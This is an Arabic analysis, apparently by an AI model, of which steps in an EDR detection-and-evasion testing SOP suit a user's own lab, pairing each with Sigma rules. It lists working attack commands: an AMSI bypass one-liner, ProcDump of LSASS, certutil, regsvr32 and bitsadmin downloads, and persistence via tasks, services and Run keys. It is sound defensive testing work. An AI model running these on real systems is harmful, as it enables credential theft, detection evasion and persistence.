# تحليل تطبيق SOP Detection & Evasion Testing على بيئة EDR

## الجواب المختصر

> [!IMPORTANT]
> **نعم، يمكنك تطبيق جزء كبير من هذا الـ SOP** على بيئتك التجريبية! الـ SOP مصمم خصيصاً لاختبار أنظمة EDR مثل نظامك. لكن ليست كل الاختبارات قابلة للتطبيق - بعضها يحتاج أدوات إضافية غير موجودة في بيئتك.

---

## 1. مطابقة قدرات الـ Agent مع اختبارات الـ SOP

الـ Windows Agent (`win_edrAgent`) يجمع التيلمتري من خلال هذه الـ Collectors:

| Collector | الملف | ما يراقبه | اختبارات SOP المرتبطة |
|---|---|---|---|
| **ETW** | `etw.go` + `etw_cgo.c` | Event Tracing for Windows (kernel + user events) | PowerShell obfuscation, AMSI bypass, Process injection |
| **Process Access** | `process_access.go` | الوصول للعمليات (مثل LSASS) | Credential Dumping (Mimikatz, ProcDump) |
| **Network** | `network.go` | اتصالات الشبكة | C2 beaconing, DNS tunneling |
| **Registry** | `registry.go` | تغييرات الريجستري | Persistence (Run keys, Services) |
| **File** | `file.go` | عمليات الملفات | Payload drops, Script execution |
| **DNS** | `dns.go` | استعلامات DNS | DNS exfiltration, C2 via DNS |
| **Image Load** | `imageload.go` | تحميل DLLs | DLL injection, DLL sideloading |
| **Pipe** | `pipe.go` | Named Pipes | C2 communication, Lateral movement |
| **WMI** | `wmi.go` | أحداث WMI | WMI persistence, WMI execution |
| **Filter** | `filter.go` | فلترة الأحداث | تصفية الضجيج |

---

## 2. Sigma Rules المتوفرة ومدى تغطيتها

### قواعد Windows المتوفرة (بحسب الفئة):

| فئة القواعد | عدد القواعد | تغطية SOP |
|---|---|---|
| `process_creation` | **~1,158 قاعدة** 🔥 | ممتازة - تغطي معظم اختبارات SOP |
| `powershell` | 3 مجلدات فرعية | جيدة - PowerShell obfuscation |
| `process_access` | ✅ | Credential dumping (LSASS) |
| `create_remote_thread` | ✅ | Process injection |
| `network_connection` | ✅ | C2 detection |
| `dns_query` | ✅ | DNS exfiltration |
| `registry` | ✅ | Persistence mechanisms |
| `file` | ✅ | File-based attacks |
| `image_load` | ✅ | DLL loading attacks |
| `pipe_created` | ✅ | Named pipe attacks |
| `wmi_event` | ✅ | WMI-based attacks |
| `driver_load` | ✅ | Rootkit/driver attacks |
| `process_tampering` | ✅ | Process hollowing |
| `edr_custom` | 2 قواعد مخصصة | VSSAdmin + Recon commands |

---

## 3. اختبارات يمكنك تطبيقها فوراً ✅

### 3.1 PowerShell Obfuscation (الأولوية: 🔴 عالية)

> [!TIP]
> هذا أفضل اختبار للبداية - سهل التنفيذ والتحقق من النتائج

**الأهداف على الأجهزة الثلاثة:**
- `win-edr-lab-eu-central-1` (3.72.37.208)
- `win-edr-lab-eu-central-2` (3.127.151.241)
- `win-edr-lab-eu-central-3` (35.157.158.135)

**الأوامر (من SOP Section 4.1):**
```powershell
# اختبار 1: Base64 encoding
$command = "Write-Host 'EDR Detection Test'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -encodedCommand $encoded

# اختبار 2: String concatenation
$c1 = "Write"
$c2 = "-Host"
$c3 = "'Evade Detection'"
IEX "$c1$c2 $c3"
```

**ما يجب أن تراه في Dashboard:**
- تنبيه من Sigma Engine على قواعد مثل:
  - `proc_creation_win_powershell_base64_encoded_cmd.yml`
  - `proc_creation_win_powershell_base64_hidden_flag.yml`
  - `proc_creation_win_powershell_base64_iex.yml`

---

### 3.2 LOLBins Testing (الأولوية: 🔴 عالية)

```powershell
# اختبار CertUtil download (Section 4.2)
certutil -urlcache -split -f http://edr.maztc.com/test.txt C:\Temp\test.txt

# اختبار Regsvr32 (COM scriptlet)
regsvr32 /s /n /u /i:http://edr.maztc.com/test.sct scrobj.dll

# اختبار MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
```

**القواعد المتوفرة:**
- `proc_creation_win_certutil_download.yml`
- `proc_creation_win_regsvr32_http_ip_pattern.yml`
- `proc_creation_win_msbuild_susp_parent_process.yml`
- مئات القواعد المشابهة في `proc_creation_win_lolbin_*.yml`

---

### 3.3 Reconnaissance Commands (الأولوية: 🟡 متوسطة)

```powershell
# System reconnaissance
whoami /all
systeminfo
ipconfig /all
net user
net localgroup administrators
tasklist /v
netstat -ano
```

**القواعد المتوفرة:**
- `edr_test_recon_commands.yml` (قاعدة مخصصة!)
- `proc_creation_win_whoami_all_execution.yml`
- `proc_creation_win_susp_recon.yml`
- `proc_creation_win_net_groups_and_accounts_recon.yml`

---

### 3.4 Scheduled Task Persistence (الأولوية: 🟡 متوسطة)

```powershell
# إنشاء task مشبوه
schtasks /create /tn "EDR_Test_Persistence" /tr "C:\Windows\System32\cmd.exe /c echo test" /sc onlogon /ru SYSTEM

# حذف بعد الاختبار
schtasks /delete /tn "EDR_Test_Persistence" /f
```

**القواعد:** `proc_creation_win_schtasks_creation.yml`, `proc_creation_win_schtasks_system.yml`

---

### 3.5 Service Manipulation (الأولوية: 🟡 متوسطة)

```powershell
# إنشاء خدمة مشبوهة
sc create EDR_Test_Service binPath= "C:\Windows\System32\cmd.exe /c echo test"

# حذف بعد الاختبار
sc delete EDR_Test_Service
```

**القواعد:** `proc_creation_win_sc_create_service.yml`, `proc_creation_win_sc_service_path_modification.yml`

---

### 3.6 Shadow Copy Deletion (الأولوية: 🔴 عالية - محاكاة ransomware)

```powershell
# اختبار VSSAdmin (قاعدة مخصصة موجودة!)
vssadmin list shadows
```

**القواعد:** `edr_custom_vssadmin.yml` (مخصصة لـ EDR), `proc_creation_win_susp_shadow_copies_deletion.yml`

> [!CAUTION]
> **لا تنفذ `vssadmin delete shadows`!** فقط `list shadows` للاختبار الآمن.

---

### 3.7 Registry Persistence (الأولوية: 🟡 متوسطة)

```powershell
# إضافة مفتاح Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EDR_Test" /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

# حذف بعد الاختبار
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EDR_Test" /f
```

**القواعد:** `proc_creation_win_reg_add_run_key.yml`, `proc_creation_win_reg_direct_asep_registry_keys_modification.yml`

---

### 3.8 Network Connection Tests (الأولوية: 🟡 متوسطة)

```powershell
# Download cradle via PowerShell
Invoke-WebRequest -Uri "http://edr.maztc.com/" -OutFile "C:\Temp\test.txt"

# BitsAdmin download
bitsadmin /transfer testjob /download /priority foreground http://edr.maztc.com/test.txt C:\Temp\test.txt
```

**القواعد:** `proc_creation_win_powershell_download_iex.yml`, `proc_creation_win_bitsadmin_download.yml`

---

## 4. اختبارات تحتاج حذر أو أدوات إضافية ⚠️

### 4.1 Credential Dumping (يحتاج Mimikatz أو أدوات مشابهة)

> [!WARNING]
> تحتاج تحميل Mimikatz أو ProcDump على الأجهزة التجريبية. Windows Defender قد يحظرها قبل تنفيذها.

**إذا أردت تنفيذها:**
```powershell
# بديل آمن: استخدم ProcDump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**القواعد:** `proc_creation_win_sysinternals_procdump_lsass.yml`, `proc_creation_win_hktl_mimikatz_command_line.yml`

---

### 4.2 Process Injection (يحتاج أدوات مخصصة)

الـ Agent يدعم الكشف عن `create_remote_thread` و `process_access`, لكن تحتاج أدوات مثل:
- `DInject`
- `Process Hacker`
- أدوات مخصصة

---

### 4.3 AMSI Bypass (متقدم)

```powershell
# هذا الاختبار قد يُكشف فوراً
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**القواعد:** `proc_creation_win_powershell_amsi_init_failed_bypass.yml`, `proc_creation_win_powershell_amsi_null_bits_bypass.yml`

---

## 5. اختبارات غير قابلة للتطبيق حالياً ❌

| الاختبار | السبب |
|---|---|
| **SIEM Correlation** | لا يوجد SIEM في البيئة (Sigma Engine يعمل كبديل) |
| **C2 Framework Testing** (Cobalt Strike) | يحتاج ترخيص وبنية تحتية C2 |
| **Lateral Movement** (Pass-the-Hash) | يحتاج Active Directory domain |
| **Network IDS/IPS Bypass** | لا يوجد IDS/IPS مخصص |
| **Kerberoasting** | يحتاج Active Directory |
| **Infection Monkey** | يحتاج بنية تحتية إضافية |

---

## 6. خطة اختبار مقترحة (مرتبة بالأولوية)

### المرحلة 1: اختبارات سريعة (30 دقيقة) 🟢

```
1. ✅ Reconnaissance commands على جهاز واحد
2. ✅ PowerShell Base64 encoding
3. ✅ VSSAdmin list shadows
4. ✅ CertUtil download test
```

### المرحلة 2: اختبارات متوسطة (1 ساعة) 🟡

```
5. ✅ Registry persistence (Run key)
6. ✅ Scheduled task creation
7. ✅ Service creation
8. ✅ LOLBins (Regsvr32, MSBuild)
```

### المرحلة 3: اختبارات متقدمة (2+ ساعة) 🔴

```
9.  ⚠️ AMSI bypass attempts
10. ⚠️ ProcDump on LSASS
11. ⚠️ PowerShell download cradles
12. ⚠️ BitsAdmin abuse
```

---

## 7. كيف تتحقق من النتائج

بعد تنفيذ كل اختبار:

1. **Dashboard** (`https://edr.maztc.com/`):
   - تحقق من تنبيهات جديدة في قسم Alerts
   - تحقق من الأحداث في Timeline للجهاز المستهدف

2. **Sigma Engine Logs**:
   ```bash
   # على السيرفر (SSH إلى 13.49.244.151)
   docker logs sigma-engine --tail 50
   ```

3. **Connection Manager**:
   ```bash
   docker logs connection-manager --tail 50
   ```

---

## 8. Atomic Red Team (الخيار الأفضل للاختبار المنظم)

> [!TIP]
> **أنصحك بشدة** بتثبيت Atomic Red Team على أحد الأجهزة التجريبية. يوفر اختبارات جاهزة مع cleanup تلقائي.

```powershell
# تثبيت على أحد أجهزة Windows
Install-Module -Name invoke-atomicredteam -Force
Import-Module invoke-atomicredteam

# تنفيذ اختبار PowerShell
Invoke-AtomicTest T1059.001

# تنفيذ اختبار Credential Dumping
Invoke-AtomicTest T1003.001

# Cleanup بعد الاختبار
Invoke-AtomicTest T1059.001 -Cleanup
```

هذا سيعطيك نتائج منظمة ومرتبطة بـ MITRE ATT&CK مباشرة.

---

## الخلاصة

| المعيار | النتيجة |
|---|---|
| **نسبة التغطية** | ~**70-75%** من اختبارات SOP قابلة للتطبيق |
| **أفضل نقطة بداية** | PowerShell + LOLBins + Recon |
| **أقوى نقطة في EDR** | 1,158+ قاعدة Sigma لـ Process Creation |
| **أضعف نقطة** | لا يوجد SIEM correlation أو Active Directory tests |
| **التوصية** | ابدأ بالمرحلة 1، ثم تدرج |

> [!NOTE]
> هل تريدني أن أبدأ بتنفيذ المرحلة الأولى من الاختبارات فعلياً؟ أو تفضل أن أجهز لك سكربت اختبار شامل يمكنك تشغيله على الأجهزة؟
